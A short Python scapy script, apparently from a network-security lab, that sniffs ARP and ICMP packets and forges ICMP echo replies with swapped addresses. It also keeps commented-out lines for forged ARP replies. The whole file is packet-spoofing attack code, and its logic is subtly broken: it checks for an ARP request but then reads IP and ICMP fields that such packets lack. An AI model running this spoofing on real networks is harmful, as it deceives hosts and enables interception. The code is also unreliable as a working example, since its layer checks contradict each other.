#!/usr/bin/python3
from scapy.all import *

# sniffing arp 
print("sniff spoff packets now")

def spoof_pkt(pkt):
	if ARP in pkt and pkt[ARP].op == 1:
		#eth = Ether(src = 'ff:ff:ff:ff:ff:ff', dst = pkt[Ether].src, type = pkt[Ether].type) 
		#arp = ARP(pdst = pkt[ARP].psrc, psrc = pkt[Ether].pdst, op = 'is-at')				
		print("original packet:  ")
		print("source ip: " , pkt[IP].src)
		print("dest ip: " , pkt[IP].dst)

		ip = IP(src = pkt[IP].dst, dst=pkt[IP].src, ihl = pkt[IP].ihl)
		icmp = ICMP(type = 0, id = pkt[ICMP].id, seq = pkt[ICMP].seq)
		data = pkt[Raw].load
		newpkt = ip/icmp/data

		print("spoofed packets..")
		print("source ip: " , newpkt[IP].src)
		print("dest ip: " , newpkt[IP].dst)
		send(newpkt, verbose = 0)

pkt = sniff(filter = 'arp or icmp', prn = spoof_pkt)


